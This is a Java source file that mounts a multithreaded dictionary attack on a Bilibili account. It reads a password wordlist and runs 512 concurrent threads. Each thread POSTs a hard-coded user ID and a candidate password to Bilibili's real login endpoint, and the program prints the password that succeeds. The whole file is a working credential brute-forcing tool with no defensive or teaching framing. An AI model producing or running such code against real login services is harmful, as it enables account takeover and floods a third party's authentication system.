package org.xzc.bilibili.api2;

import java.awt.BufferCapabilities.FlipContents;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;
import java.util.TreeSet;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.apache.commons.io.FileUtils;
import org.apache.http.client.config.CookieSpecs;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
import org.xzc.http.HC;

import com.alibaba.fastjson.JSONObject;

public class PasswordRunner {
	private static final String PASSWOD_FILENAME = "words.txt";
	private static final String USERID = "xzchaoo";

	public static void main1(String[] args) throws IOException, URISyntaxException {
		File file = new File( PasswordRunner.class.getClassLoader().getResource( PASSWOD_FILENAME ).toURI() );
		List<String> lines = FileUtils.readLines( file );
		TreeSet<String> ts = new TreeSet<String>();
		for (String s : lines)
			ts.add( s.trim() );
		FileUtils.writeLines( file, ts );
	}

	public static void main(String[] args) throws Exception {
		int timeout = 5000;
		RequestConfig rc = RequestConfig.custom()
				.setConnectionRequestTimeout( 5000 )
				.setConnectTimeout( timeout )
				.setSocketTimeout( timeout )
				.setCookieSpec( CookieSpecs.IGNORE_COOKIES )
				.build();
		int batch = 512;
		PoolingHttpClientConnectionManager p = new PoolingHttpClientConnectionManager();
		p.setMaxTotal( batch * 4 );
		p.setDefaultMaxPerRoute( batch );
		CloseableHttpClient chc = HttpClients.custom()
				.setDefaultRequestConfig( rc )
				.setConnectionManager( p )
				.build();
		final HC hc = new HC( chc );
		File file = new File( PasswordRunner.class.getClassLoader().getResource( PASSWOD_FILENAME ).toURI() );
		final LinkedBlockingQueue<String> passwodList = new LinkedBlockingQueue<String>( FileUtils.readLines( file ) );
		ExecutorService es = Executors.newFixedThreadPool( batch );
		final AtomicBoolean stop = new AtomicBoolean( false );
		final AtomicInteger count = new AtomicInteger( 0 );
		List<Future<?>> futureList = new ArrayList<Future<?>>( batch );
		for (int i = 0; i < batch; ++i) {
			Future<Void> f = es.submit( new Callable<Void>() {
				public Void call() throws Exception {
					while (!stop.get()) {
						String p = passwodList.poll();
						if (p == null)
							break;
						int mycount = count.incrementAndGet();
						if (mycount % 1000 == 0) {
							System.out.println( mycount + " " + p );
						}
						HttpUriRequest req = RequestBuilder.post( "http://account.bilibili.com/ajax/miniLogin/login" )
								.addParameter( "userid", USERID ).addParameter( "pwd", p ).build();
						JSONObject json = hc.asJSON( req );
						if (json.getBooleanValue( "status" )) {
							System.out.println( p );
							stop.set( true );
						}else{
							System.out.println( json );
						}
					}
					return null;
				}
			} );
			futureList.add( f );
		}
		for (Future<?> f : futureList)
			f.get();
		es.shutdown();
		hc.close();
		System.out.println( "结束" );
	}
}
